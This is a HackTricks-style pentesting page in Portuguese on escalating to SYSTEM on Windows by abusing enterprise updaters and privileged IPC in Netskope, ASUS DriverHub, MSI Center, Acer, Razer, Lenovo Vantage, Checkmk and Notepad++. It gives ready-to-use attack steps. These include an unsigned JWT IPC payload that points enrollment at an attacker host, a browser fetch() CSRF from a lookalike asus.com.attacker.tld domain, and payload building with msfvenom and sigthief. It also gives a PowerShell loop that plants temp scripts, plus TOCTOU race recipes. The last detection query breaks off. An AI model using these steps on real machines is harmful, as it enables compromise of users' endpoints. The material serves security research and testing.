# Abusando de atualizadores automáticos empresariais e IPC privilegiado (e.g., Netskope, ASUS & MSI)

{{#include ../../banners/hacktricks-training.md}}

Esta página generaliza uma classe de cadeias de escalonamento de privilégios locais no Windows encontradas em agentes e atualizadores corporativos de endpoint que expõem uma superfície de IPC de fácil acesso e um fluxo de atualização privilegiado. Um exemplo representativo é o Netskope Client for Windows < R129 (CVE-2025-0309), no qual um usuário com poucos privilégios pode forçar o processo de enrollment a usar um servidor controlado por um atacante e, em seguida, entregar um MSI malicioso que o serviço SYSTEM instala.<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>

Ideias principais que você pode reutilizar contra produtos semelhantes:
- Abusar do IPC localhost de um serviço privilegiado para forçar um novo enrollment ou uma reconfiguração para um servidor do atacante.
- Implementar os endpoints de atualização do fornecedor, entregar uma Trusted Root CA não autorizada e apontar o updater para um pacote malicioso “assinado”.
- Contornar verificações fracas do assinante (listas de permissões de CN), flags opcionais de digest e propriedades de MSI permissivas.
- Se o IPC for “encrypted”, derivar a chave/IV de identificadores de máquina legíveis por todos e armazenados no registro.
- Se o serviço restringir os chamadores pelo caminho da imagem/nome do processo, injetar em um processo permitido ou iniciar um processo suspenso e inicializar sua DLL por meio de uma alteração mínima no contexto do thread.

Serviços TCP locais personalizados merecem a mesma análise de identidade e limites de entrada, mesmo quando exigem um PIN ou outra credencial da aplicação. Identifique o processo associado ao listener e a conta de serviço efetiva; em seguida, inspecione o binário/versão implantado e verifique se os campos controlados pelo chamador têm seus comprimentos validados antes de serem copiados para buffers de tamanho fixo ou usados para construir um comando de processo filho. [A orientação da Microsoft sobre buffer overrun](https://learn.microsoft.com/en-us/windows/win32/secbp/avoiding-buffer-overruns) explica por que entradas externas não verificadas são perigosas em código nativo privilegiado. Um listener de loopback, uma credencial hardcoded ou apenas o nome do processo não comprovam corrupção de memória nem execução como SYSTEM; acessibilidade, autorização, caminho do código e mitigações continuam sendo condições distintas. Mantenha a enumeração de rotina passiva, em vez de enviar entradas com tamanho suficiente para causar um crash a um serviço ativo.

---
## 1) Forçando o enrollment para um servidor do atacante via IPC localhost

Muitos agentes incluem um processo de interface do usuário em modo de usuário que se comunica com um serviço SYSTEM por TCP localhost usando JSON.

Observado no Netskope:
- Interface do usuário: stAgentUI (integridade baixa) ↔ Serviço: stAgentSvc (SYSTEM)
- ID do comando IPC 148: IDP_USER_PROVISIONING_WITH_TOKEN

Fluxo de exploração:
1) Crie um token de enrollment JWT cujas claims controlem o host do backend (por exemplo, AddonUrl). Use alg=None para que nenhuma assinatura seja necessária.
2) Envie a mensagem IPC que invoca o comando de provisioning com seu JWT e o nome do tenant:

```json
{
  "148": {
    "idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
    "tenantName": "TestOrg"
  }
}
```

3) O serviço começa a se conectar ao seu servidor malicioso para enrollment/config, por exemplo:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Observações:
- Se a verificação do chamador for baseada no caminho/nome, origine a solicitação de um binário de fornecedor allow-listed (consulte §4).<sup>[[1]](#references)[[2]](#references)</sup>

### IPC de gerenciamento exposto à rede

Esse limite de confiança nem sempre se restringe ao localhost. No caso relatado do MyReport Updater 2.1.1, um serviço `LocalSystem` escutava em todas as interfaces e aceitava uma alteração de configuração via gRPC não autenticada para o host de referência, a porta e o modo de operação. Para a variante remota, eram necessários tanto o acesso de rede ao listener quanto o acesso de saída do serviço ao host de referência escolhido. Avalie esses requisitos separadamente de a etapa posterior do fluxo do pacote conseguir ou não ultrapassar o limite de gravação de arquivos.<sup>[[16]](#references)</sup>

---
## 2) Sequestrando o canal de atualização para executar código como SYSTEM

Quando o cliente se conectar ao seu servidor, implemente os endpoints esperados e direcione-o para um MSI controlado pelo atacante. Sequência típica:

1) /v2/config/org/clientconfig → Retorne uma configuração JSON com um intervalo de atualização muito curto, por exemplo:
```json
{
  "clientUpdate": { "updateIntervalInMin": 1 },
  "check_msi_digest": false
}
```
2) /config/ca/cert → Retorne um certificado CA PEM. O serviço o instala no repositório Trusted Root da Local Machine.
3) /v2/checkupdate → Forneça metadados que apontem para um MSI malicioso e uma versão falsa.

Como contornar verificações comuns encontradas na prática:
- Allow-list do CN do signatário: o serviço pode apenas verificar se o CN do Subject é igual a “netSkope Inc” ou “Netskope, Inc.”. Sua CA rogue pode emitir um certificado leaf com esse CN e assinar o MSI.
- Propriedade CERT_DIGEST: inclua uma propriedade benigna de MSI chamada CERT_DIGEST. Não há validação na instalação.
- Validação opcional do digest: uma flag de configuração (por exemplo, check_msi_digest=false) desativa a validação criptográfica adicional.

Resultado: o serviço SYSTEM instala seu MSI de
C:\ProgramData\Netskope\stAgent\data\*.msi
executando código arbitrário como NT AUTHORITY\SYSTEM.<sup>[[1]](#references)[[2]](#references)</sup>

Lição sobre contornar patches: se um fornecedor responder adicionando uma pequena lista de domínios “confiáveis” em vez de autenticar criptograficamente a origem da atualização, procure redirecionadores ou proxies reversos pertencentes ao fornecedor que ainda permitam direcionar o tráfego. No caso da Netskope, pesquisas públicas posteriores mostraram que uma allow-list da era R129 ainda podia ser explorada por meio de `rproxy.goskope.com`, que fazia proxy de conteúdo controlado pelo atacante em um Azure App Service. Trate allow-lists de nomes de host como um obstáculo, não como um limite de confiança.<sup>[[14]](#references)</sup>

Outro modo de falha são **metadados de pacote internamente consistentes, mas não autenticados**. No caso do MyReport, uma referência controlada pelo atacante servia um arquivo compactado modificado, enquanto um intermediário alterava o digest MD5 e as respostas de tamanho do fornecedor antes que chegassem ao atualizador. A correspondência desses valores verificava a consistência das respostas, não a origem do fornecedor; não foi necessário gerar uma colisão MD5. Um diretório de instalação escolhido pelo solicitante transformava então a extração privilegiada em um limite de gravação de arquivos. A primitiva resultante de carregamento de DLL é abordada em [encadear uma gravação arbitrária de arquivo ao DLL hijacking](dll-hijacking/#chaining-an-arbitrary-file-write-into-a-missing-dll-hijack).<sup>[[16]](#references)</sup>

---
## 3) Forjar solicitações IPC criptografadas (quando presentes)

A partir da R127, a Netskope passou a encapsular o JSON do IPC em um campo encryptData que se parece com Base64. A engenharia reversa revelou o uso de AES, com chave/IV derivados de valores do registro legíveis por qualquer usuário:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Atacantes podem reproduzir a criptografia e enviar comandos criptografados válidos a partir de um usuário padrão.<sup>[[1]](#references)[[2]](#references)</sup> Dica geral: se um agente de repente “criptografar” seu IPC, procure IDs de dispositivo, GUIDs de produto e IDs de instalação em HKLM que possam ser usados como material.

---
## 4) Contornar allow-lists de chamadores IPC (verificações de caminho/nome)

Alguns serviços tentam autenticar o peer resolvendo o PID da conexão TCP e comparando o caminho/nome da imagem com binários do fornecedor em allow-lists, localizados em Program Files (por exemplo, stagentui.exe, bwansvc.exe, epdlp.exe).

Dois métodos práticos para contornar isso:
- Injeção de DLL em um processo em allow-list (por exemplo, nsdiag.exe) e proxy do IPC a partir dele.
- Iniciar um binário em allow-list suspenso e carregar sua DLL proxy sem CreateRemoteThread (consulte §5) para satisfazer as regras contra adulteração impostas pelo driver.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 5) Injeção compatível com proteção contra adulteração: processo suspenso + patch de NtContinue

Os produtos geralmente incluem um driver minifilter/de callbacks OB (por exemplo, Stadrv) para remover direitos perigosos de handles para processos protegidos:
- Processo: remove PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: restringe a THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

Um loader confiável em user-mode que respeita essas restrições:
1) Crie um processo de um binário do fornecedor com CREATE_SUSPENDED.
2) Obtenha os handles que ainda são permitidos: PROCESS_VM_WRITE | PROCESS_VM_OPERATION para o processo e um handle de thread com THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (ou apenas THREAD_RESUME se você aplicar o patch ao código em um RIP conhecido).
3) Sobrescreva ntdll!NtContinue (ou outro thunk inicial garantidamente mapeado) com um pequeno stub que chama LoadLibraryW no caminho da sua DLL e, em seguida, retorna.
4) Execute ResumeThread para acionar o stub no processo e carregar sua DLL.

Como você nunca usou PROCESS_CREATE_THREAD ou PROCESS_SUSPEND_RESUME em um processo já protegido (você o criou), a política do driver é respeitada.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 6) Ferramentas práticas
- NachoVPN (plugin da Netskope) automatiza uma CA rogue, a assinatura de um MSI malicioso e serve os endpoints necessários: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.<sup>[[3]](#references)</sup>
- UpSkope é um cliente IPC personalizado que cria mensagens IPC arbitrárias (opcionalmente criptografadas com AES) e inclui a injeção em processo suspenso para originar a comunicação de um binário em allow-list.<sup>[[4]](#references)</sup>

## 7) Fluxo rápido de triagem para superfícies desconhecidas de atualizador/IPC

Ao avaliar um novo agente de endpoint ou uma suíte de “helper” de placa-mãe, um fluxo rápido geralmente basta para determinar se você está diante de um alvo promissor para privesc:<sup>[[6]](#references)</sup>

1) Enumere os listeners de loopback e associe-os aos processos do fornecedor:

```powershell
Get-NetTCPConnection -State Listen |
  Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
  Select-Object LocalAddress,LocalPort,OwningProcess,
    @{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```

2) Enumerar os named pipes candidatos:

```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```

3) Extraia dados de roteamento do Registro usados por servidores IPC baseados em plugins:

```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
  Select-Object PSChildName
```

4) Extraia primeiro os nomes dos endpoints, as chaves JSON e os IDs de comando do cliente em modo de usuário. Frontends Electron/.NET empacotados frequentemente vazam o esquema completo:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
  -Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```

5) Procure o predicado de confiança real, não apenas o caminho de código que eventualmente inicia o processo:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
  -Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```

Padrões que vale priorizar:
- `CryptQueryObject`/análise de certificados sem `WinVerifyTrust` geralmente significa que “o certificado existe” foi tratado como “o certificado é confiável”, permitindo clonagem de certificados ou outros truques com signatários falsos.
- Verificações de substring/sufixo em `Origin`, `Referer`, URLs de download, nomes de processos ou CNs de signatários não são autenticação. `contains(".vendor.com")` geralmente é explorável com domínios parecidos controlados pelo atacante.
- Se a GUI de baixo privilégio decide que “o arquivo é confiável” e o broker SYSTEM apenas consome esse resultado, corrigir ou reimplementar a DLL/JS do lado do cliente geralmente contorna completamente a fronteira (validação dividida no estilo Razer).
- Se o broker copia um payload para `%TEMP%`/`C:\Windows\Temp` e depois o valida ou agenda a partir desse caminho, teste imediatamente janelas de substituição TOCTOU e módulos de plugin irmãos que exponham wrappers alternativos de `ExecuteTask()` com verificações mais fracas.<sup>[[6]](#references)</sup>

Para alvos com muitas named pipes, o PipeViewer é uma forma rápida de identificar DACLs fracas e pipes acessíveis remotamente antes de começar a fazer reversing do protocolo em profundidade.<sup>[[11]](#references)</sup>

Se o alvo autentica os chamadores apenas por PID, caminho da imagem ou nome do processo, trate isso como um obstáculo, não como uma fronteira: injetar no cliente legítimo ou fazer a conexão a partir de um processo na allow-list costuma ser suficiente para satisfazer as verificações do servidor. Especificamente para named pipes, [esta página sobre impersonation de cliente e abuso de pipes](named-pipe-client-impersonation.md) explica o primitive em mais detalhes.

Para um **broker de cleanup ou restore** privilegiado, inspecione a fronteira de confiança do caminho, além da ACL do pipe. Um chamador com menos privilégios pode conseguir selecionar um destino de restore ou renomear um artefato de backup preparado em um diretório compartilhado, mesmo que o executável do serviço e seu diretório de instalação estejam protegidos. Confirme separadamente que o chamador consegue acessar o comando de restore, modificar a entrada preparada ou o nome de arquivo exatos, que o broker é executado com uma identidade de nível superior e que a operação de restore realmente grava no caminho protegido selecionado. Um diretório de staging gravável ou um pipe legível, por si só, não comprova uma gravação privilegiada arbitrária; o mapeamento do destino e o comportamento do serviço precisam de revisão de código ou testes controlados. Não invoque um comando de cleanup desconhecido durante a enumeração passiva, pois ele pode excluir arquivos do usuário.

---
## 8) Brokers modulares de add-ins autenticados apenas por assinaturas do fornecedor (padrão Lenovo Vantage)

Uma variação mais recente que vale investigar é o **broker RPC de cliente assinado**: um processo de desktop Lenovo assinado, com poucos privilégios, se comunica com um serviço SYSTEM, e o serviço encaminha comandos JSON para um conjunto de add-ins descritos em XML sob `%ProgramData%`. Após obter execução de código **dentro de qualquer cliente assinado aceito**, todo contrato `runas="system"` passa a fazer parte da superfície de ataque.<sup>[[15]](#references)</sup>

Primitives de alto valor observados em pesquisas sobre Lenovo Vantage:
- **Confiar no chamador por ser assinado pelo fornecedor**: pesquisadores chegaram a um contexto autenticado copiando um EXE assinado pela Lenovo para um diretório gravável e atendendo a um DLL side-load (`profapi.dll`) para que um código arbitrário fosse executado dentro de um cliente já confiável para o serviço.
- **Descoberta da superfície de ataque orientada por manifestos**: os add-ins são declarados em `C:\ProgramData\Lenovo\Vantage\Addins\*.xml`; vários contratos são executados como `SYSTEM`, portanto enumerar esses manifestos geralmente revela os verbos privilegiados reais mais rapidamente do que fazer reversing do próprio broker.
- **Bugs por comando por trás do canal autenticado**: uma vez dentro do cliente confiável, pesquisas públicas encontraram path traversal e race conditions em verbos de update/install, abuso de raw SQL em bancos de dados privilegiados de configurações e verificações de caminho de registro baseadas em substring que permitiam gravações fora da hive pretendida.

Recon útil em um alvo:

```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
  Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
  -Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```

Conclusão prática: sempre que um conjunto de utilitários expuser um broker que primeiro autentica o **processo chamador** e só então encaminha chamadas para dezenas de comandos de plugins/add-ins, não pare após contornar a verificação de confiança inicial. Extraia a tabela de manifest/contratos e faça fuzzing de cada verbo de alto privilégio de forma independente; o canal autenticado costuma ocultar vários bugs de segunda etapa.

---
## 1) CSRF do navegador para localhost contra APIs HTTP privilegiadas (ASUS DriverHub)

O DriverHub inclui um serviço HTTP em modo usuário (ADU.exe) em 127.0.0.1:53000 que espera chamadas do navegador originadas de https://driverhub.asus.com. O filtro de origem simplesmente executa `string_contains(".asus.com")` no cabeçalho Origin e nas URLs de download expostas por `/asus/v1.0/*`. Portanto, qualquer host controlado por um atacante, como `https://driverhub.asus.com.attacker.tld`, passa pela verificação e pode emitir requisições que alteram o estado usando JavaScript.<sup>[[6]](#references)</sup> Consulte [noções básicas de CSRF](../../pentesting-web/csrf-cross-site-request-forgery.md) para outros padrões de bypass.

Fluxo prático:
1) Registre um domínio que contenha `.asus.com` e hospede nele uma página maliciosa.
2) Use `fetch` ou XHR para chamar um endpoint privilegiado (por exemplo, `Reboot`, `UpdateApp`) em `http://127.0.0.1:53000`.
3) Envie o corpo JSON esperado pelo handler – o JS empacotado do frontend mostra o esquema abaixo.

```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```

Até mesmo a CLI do PowerShell mostrada abaixo funciona quando o cabeçalho Origin é falsificado para usar o valor confiável:

```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
  -Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
  -Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```

Qualquer visita do navegador ao site do atacante se torna, portanto, um CSRF local de 1 clique (ou 0 clique via `onload`) que controla um helper SYSTEM.

---
## 2) Verificação insegura de assinatura de código e clonagem de certificados (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` baixa executáveis arbitrários definidos no corpo JSON e os armazena em cache em `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. A validação da URL de download reutiliza a mesma lógica de substring, então `http://updates.asus.com.attacker.tld:8000/payload.exe` é aceito. Após o download, o ADU.exe apenas verifica se o PE contém uma assinatura e se a string Subject corresponde à ASUS antes de executá-lo — sem `WinVerifyTrust` e sem validação da cadeia.

Para explorar esse fluxo:
1) Crie um payload (por exemplo, `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Clone o signer da ASUS para ele (por exemplo, `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Hospede `pwn.exe` em um domínio parecido com `.asus.com` e acione o UpdateApp por meio do CSRF do navegador acima.

Como os filtros de Origin e URL são baseados em substring e a verificação do signer apenas compara strings, o DriverHub baixa e executa o binário do atacante com seu contexto elevado.<sup>[[6]](#references)</sup>

---
## 1) TOCTOU nos caminhos de cópia/execução do updater (MSI Center CMD_AutoUpdateSDK)

O serviço SYSTEM do MSI Center expõe um protocolo TCP em que cada frame é `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. O componente principal (Component ID `0f 27 00 00`) inclui `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. O handler:
1) Copia o executável fornecido para `C:\Windows\Temp\MSI Center SDK.exe`.
2) Verifica a assinatura por meio de `CS_CommonAPI.EX_CA::Verify` (o subject do certificado deve ser igual a “MICRO-STAR INTERNATIONAL CO., LTD.” e `WinVerifyTrust` deve ser bem-sucedido).
3) Cria uma tarefa agendada que executa o arquivo temporário como SYSTEM com argumentos controlados pelo atacante.

O arquivo copiado não é bloqueado entre a verificação e `ExecuteTask()`. Um atacante pode:
- Enviar o Frame A apontando para um binário legítimo assinado pela MSI (garante que a verificação da assinatura passe e que a tarefa seja enfileirada).
- Disputar a condição de corrida com mensagens Frame B repetidas apontando para um payload malicioso, sobrescrevendo `MSI Center SDK.exe` logo após a conclusão da verificação.

Quando o agendador é acionado, ele executa o payload sobrescrito como SYSTEM, apesar de ter validado o arquivo original. Uma exploração confiável usa duas goroutines/threads que enviam repetidamente `CMD_AutoUpdateSDK` até vencer a janela TOCTOU.<sup>[[6]](#references)</sup>

---
## 2) Abuso de IPC personalizado em nível SYSTEM e impersonation (MSI Center + Acer Control Centre)

### Conjuntos de comandos TCP do MSI Center
- Cada plugin/DLL carregado por `MSI.CentralServer.exe` recebe um Component ID armazenado em `HKLM\SOFTWARE\MSI\MSI_CentralServer`. Os primeiros 4 bytes de um frame selecionam esse componente, permitindo que atacantes roteiem comandos para módulos arbitrários.
- Plugins podem definir seus próprios task runners. `Support\API_Support.dll` expõe `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` e chama diretamente `API_Support.EX_Task::ExecuteTask()` **sem validação de assinatura** — qualquer usuário local pode apontá-lo para `C:\Users\<user>\Desktop\payload.exe` e obter execução SYSTEM de forma determinística.
- Capturar o loopback com Wireshark ou instrumentar os binários .NET no dnSpy revela rapidamente o mapeamento entre componentes e comandos; clientes personalizados em Go/Python podem então reproduzir os frames.<sup>[[6]](#references)</sup>

### Named pipes do Acer Control Centre e níveis de impersonation
- `ACCSvc.exe` (SYSTEM) expõe `\\.\pipe\treadstone_service_LightMode`, e sua ACL discricionária permite clientes remotos (por exemplo, `\\TARGET\pipe\treadstone_service_LightMode`). O envio do command ID `7` com um caminho de arquivo aciona a rotina de criação de processos do serviço.
- A biblioteca cliente serializa um byte terminador mágico (113) junto com os argumentos. A instrumentação dinâmica com Frida/`TsDotNetLib` (consulte [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) para dicas de instrumentação) mostra que o handler nativo mapeia esse valor para um `SECURITY_IMPERSONATION_LEVEL` e um integrity SID antes de chamar `CreateProcessAsUser`.
- A troca de 113 (`0x71`) por 114 (`0x72`) direciona a execução para o branch genérico, que mantém o token SYSTEM completo e define um SID de alta integridade (`S-1-16-12288`). Assim, o binário iniciado é executado como SYSTEM irrestrito, tanto localmente quanto entre máquinas.
- Combine isso com a flag de instalação exposta (`Setup.exe -nocheck`) para instalar o ACC até mesmo em VMs de laboratório e testar o pipe sem hardware do fornecedor.<sup>[[6]](#references)</sup>

Esses bugs de IPC mostram por que serviços localhost devem exigir autenticação mútua (ALPC SIDs, filtros `ImpersonationLevel=Impersonation`, filtragem de tokens) e por que o helper “executar binário arbitrário” de cada módulo deve usar as mesmas verificações de signer.

---
## 3) Helpers “elevator” de COM/IPC com validação fraca em user-mode (Razer Synapse 4)

O Razer Synapse 4 acrescentou outro padrão útil a essa família: um usuário com poucos privilégios pode solicitar a um helper COM que inicie um processo por meio de `RzUtility.Elevator`, enquanto a decisão de confiança é delegada a uma DLL em user-mode (`simple_service.dll`), em vez de ser aplicada de forma robusta dentro do limite privilegiado.

Caminho de exploração observado:
- Instancie o objeto COM `RzUtility.Elevator`.
- Chame `LaunchProcessNoWait(<path>, "", 1)` para solicitar uma execução elevada.
- No PoC público, o controle de assinatura PE dentro de `simple_service.dll` é desativado por patch antes de enviar a solicitação, permitindo que um executável arbitrário escolhido pelo atacante seja iniciado.<sup>[[6]](#references)[[10]](#references)</sup>

Invocação mínima do PowerShell:

```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```

Conclusão geral: ao fazer reverse engineering de suítes “helper”, não se limite a TCP localhost ou named pipes. Verifique se há classes COM com nomes como `Elevator`, `Launcher`, `Updater` ou `Utility` e, em seguida, confirme se o serviço privilegiado realmente valida o binário de destino ou apenas confia em um resultado calculado por uma DLL cliente em user-mode que pode ser modificada. Esse padrão se aplica além da Razer: qualquer arquitetura dividida em que o broker de alto privilégio consome uma decisão de permitir/negar do lado de baixo privilégio é uma possível superfície de privesc.


---
## Execução previsível de script temporário durante o reparo do MSI (Checkmk Agent / CVE-2024-0670)

Alguns agentes do Windows ainda implementam ações privilegiadas gravando um `.cmd` temporário em `C:\Windows\Temp` e executando-o como `SYSTEM`. Se o nome do arquivo for previsível e o serviço não recriar arquivos existentes com segurança, um usuário com poucos privilégios pode pré-criar o futuro arquivo temporário como **somente leitura** e fazer com que o processo privilegiado execute conteúdo controlado pelo atacante em vez do próprio script.

Observado em builds vulneráveis do Checkmk Agent:
- padrão do arquivo temporário: `cmk_all_<PID>_1.cmd`
- branches afetadas: `2.0.0`, `2.1.0`, `2.2.0`
- gatilho: **reparo** do pacote MSI do agente em cache<sup>[[8]](#references)[[9]](#references)</sup>

Fluxo de trabalho prático:
1. Estime um intervalo realista de PID com base nos IDs de processo atuais ou no PID do agente em execução.
2. Grave um payload `.cmd` curto em **ASCII** (`Set-Content -Encoding Ascii` ou redirecionamento de `cmd.exe`; evite a saída UTF-16 do PowerShell para arquivos batch).
3. Distribua arquivos `C:\Windows\Temp\cmk_all_<PID>_1.cmd` pelo intervalo candidato e marque cada arquivo como somente leitura.
4. Acione o reparo do MSI em cache para que o serviço privilegiado tente recriar e, em seguida, execute o script temporário.<sup>[[7]](#references)</sup>

```powershell
Set-Content -Path C:\ProgramData\payload.cmd -Encoding Ascii -Value "@echo off`nwhoami > C:\ProgramData\proof.txt"
1..10000 | ForEach-Object {
  Copy-Item C:\ProgramData\payload.cmd "C:\Windows\Temp\cmk_all_${_}_1.cmd"
  Set-ItemProperty "C:\Windows\Temp\cmk_all_${_}_1.cmd" -Name IsReadOnly -Value $true
}
```

Se o produto vulnerável estiver instalado com o Windows Installer, associe o MSI em cache com nome aparentemente aleatório em `C:\Windows\Installer` ao nome do produto antes de acionar o reparo:<sup>[[7]](#references)</sup>

```powershell
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties" |
  ForEach-Object {
    $p = Get-ItemProperty $_.PSPath
    [PSCustomObject]@{Name=$p.DisplayName; Pkg=$p.LocalPackage}
  } | Where-Object Name -like "*Check MK Agent*"

msiexec /fa C:\Windows\Installer\<cached-agent>.msi
```

Notas operacionais:
- `qwinsta` é útil quando `msiexec /fa` falha em um shell WinRM não interativo e você precisa entender se uma sessão existente, desconectada ou com desktop pode acionar o reparo corretamente.<sup>[[7]](#references)</sup>
- Esse padrão se aplica também a outros agentes de endpoint e atualizadores que **preparam scripts temporários em locais world-writable e depois os executam como SYSTEM**. Teste nomes previsíveis, ausência de semântica de criação exclusiva e fluxos de reparo/atualização que possam ser acionados sob demanda.

### Reparo interativo do instalador e console privilegiado

O PDF24 Creator 11.15.1 ilustra um risco distinto de reparo de MSI: durante o reparo, sua ação personalizada de instalação da impressora pode iniciar um console visível com direitos de SYSTEM. O fornecedor alterou o instalador MSI na versão 11.15.2 para corrigir esse comportamento. Uma versão antiga do produto é apenas uma pista para triagem. Verifique o pacote MSI registrado ou acessível, se esse usuário pode iniciar o reparo, se a ação personalizada vulnerável e o atraso no arquivo de log estão presentes e se um desktop interativo pode expor o console. O atraso relatado usava um oplock em `faxPrnInst.log`; a gravação comum no arquivo não é a única condição de acesso. Um shell não interativo, um pacote inacessível ou um instalador corrigido podem interromper a cadeia. Esse problema não depende de `AlwaysInstallElevated` e é diferente de substituir um script temporário previsível.

---
## Sequestro remoto da cadeia de suprimentos por validação fraca do atualizador (WinGUp / Notepad++)

Entre junho de 2025 e dezembro de 2025, invasores que comprometeram a infraestrutura de hospedagem por trás do fluxo de atualização do Notepad++ forneceram seletivamente manifests maliciosos a vítimas escolhidas. Os atualizadores mais antigos baseados em WinGUp não verificavam completamente a autenticidade das atualizações, então uma resposta XML maliciosa podia redirecionar os clientes para URLs controladas pelos invasores. Como o cliente aceitava conteúdo HTTPS sem exigir tanto uma cadeia de certificados confiável quanto uma assinatura PE válida no instalador baixado, as vítimas baixavam e executavam um `update.exe` NSIS trojanizado.<sup>[[12]](#references)[[13]](#references)</sup>

Fluxo operacional (não exige exploit local):
1. **Interceptação da infraestrutura**: comprometer o CDN/a hospedagem e responder às verificações de atualização com metadados controlados pelos invasores que apontam para uma URL de download maliciosa.
2. **NSIS trojanizado**: o instalador baixa/executa um payload e abusa de duas cadeias de execução:
   - **Usar binário assinado próprio + sideload**: incluir o `BluetoothService.exe` assinado da Bitdefender e colocar uma `log.dll` maliciosa no caminho de pesquisa. Quando o binário assinado é executado, o Windows faz sideload da `log.dll`, que descriptografa e carrega reflexivamente o backdoor Chrysalis (protegido por Warbird + hashing de API para dificultar a detecção estática).
   - **Injeção de shellcode por script**: o NSIS executa um script Lua compilado que usa APIs do Win32 (por exemplo, `EnumWindowStationsW`) para injetar shellcode e preparar o Cobalt Strike Beacon.<sup>[[12]](#references)</sup>

Lições de hardening/detecção para qualquer atualizador automático:
- Exija **verificação do certificado e da assinatura** do instalador baixado (fixe o signatário do fornecedor, rejeite CN/cadeias incompatíveis) e assine o próprio manifest de atualização (por exemplo, com XMLDSig). Bloqueie redirecionamentos controlados pelo manifest, a menos que tenham sido validados.
- Trate o **sideload de binários assinados próprios** como um pivot de detecção pós-download: gere alertas quando um EXE assinado do fornecedor carrega uma DLL de um local fora do caminho canônico de instalação (por exemplo, quando o Bitdefender carrega `log.dll` de Temp/Downloads) e quando um atualizador coloca/executa instaladores em diretórios temporários com assinaturas que não são do fornecedor.
- Monitore **artefatos específicos do malware** observados nessa cadeia (úteis como pivots genéricos): mutex `Global\Jdhfv_1.0.1`, gravações anômalas de `gup.exe` em `%TEMP%` e etapas de injeção de shellcode conduzidas por Lua.
- O Notepad++ respondeu fortalecendo o WinGUp na versão v8.8.9 e posteriores: o XML retornado agora é assinado (XMLDSig), e as versões mais recentes exigem a verificação do certificado e da assinatura do instalador baixado, em vez de confiar apenas no transporte.<sup>[[13]](#references)</sup>

<details>
<summary>Cortex XDR XQL – sideload de <code>log.dll</code> por EXE assinado da Bitdefender (T1574.001)</summary>

```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```

</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> iniciando um instalador que não é do Notepad++</summary>

```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
